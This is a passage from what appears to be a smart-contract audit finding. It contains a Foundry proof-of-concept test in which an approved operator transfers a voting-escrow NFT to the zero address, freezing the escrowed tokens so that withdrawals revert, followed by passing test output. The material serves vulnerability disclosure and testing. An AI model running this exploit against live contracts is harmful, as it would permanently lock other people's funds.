   // withdraw attempts revert due to _isApprovedOrOwner check failing\n        vm.expectRevert(stdError.assertionError);\n        vm.prank(user);\n        ve.withdraw(tokenId);\n\n        vm.expectRevert(stdError.assertionError);\n        vm.prank(attacker);\n        ve.withdraw(tokenId);\n    }\n\n    function test_PoC_VE_ZeroAddressTransfer_FreezesFunds_NonSafe() external {\n        uint256 tokenId = _tokenIdOf(user);\n\n        // escrowed funds present in VE\n        uint256 veBalBefore = token.balanceOf(address(ve));\n        assertGt(veBalBefore, 0);\n        uint256 supplyBefore = ve.totalSupply();\n        assertGt(supplyBefore, 0);\n\n        // sanity gates\n        assertEq(ve.attachments(tokenId), 0);\n        assertTrue(!ve.voted(tokenId));\n\n        // grant operator approval\n        vm.prank(user);\n        ve.setApprovalForAll(attacker, true);\n\n        // attacker uses non-safe transfer to zero address\n        vm.prank(attacker);\n        ve.transferFrom(user, address(0), tokenId);\n\n        // owner is zero and funds remain stuck\n        assertEq(ve.ownerOf(tokenId), address(0));\n        uint256 veBalAfter = token.balanceOf(address(ve));\n        assertEq(veBalAfter, veBalBefore);\n        uint256 supplyAfter = ve.totalSupply();\n        assertEq(supplyAfter, supplyBefore);\n        (int128 amt,,) = ve.locked(tokenId);\n        assertGt(uint256(int256(amt)), 0);\n\n        // withdraw attempts revert with assertion error\n        vm.expectRevert(stdError.assertionError);\n        vm.prank(user);\n        ve.withdraw(tokenId);\n\n        vm.expectRevert(stdError.assertionError);\n        vm.prank(attacker);\n        ve.withdraw(tokenId);\n    }\n}\n```\n\nExpected result:\n```text\nBoth tests pass; ownership becomes address(0); escrowed funds and VE supply unchanged; withdraw reverts from all callers\n```\n\nActual run (local):\n```text\nRan 2 tests for test/C4PoC_ZeroAddressTransfer.t.sol:C4PoC_ZeroAddressTransfer\n[PASS] test_PoC_VE_ZeroAddressTransfer_FreezesFunds() (gas: 207251)\n[PASS] test_PoC_VE_ZeroAddressTransfer_FreezesFunds_NonSafe() (gas: 204209)\nSuite result: ok. 2 passed; 0 failed; 0 skipped; finished in 18.55ms (1.56ms CPU time)\n\nRan 1 test suite in 782.19ms (18.55ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)\n```",
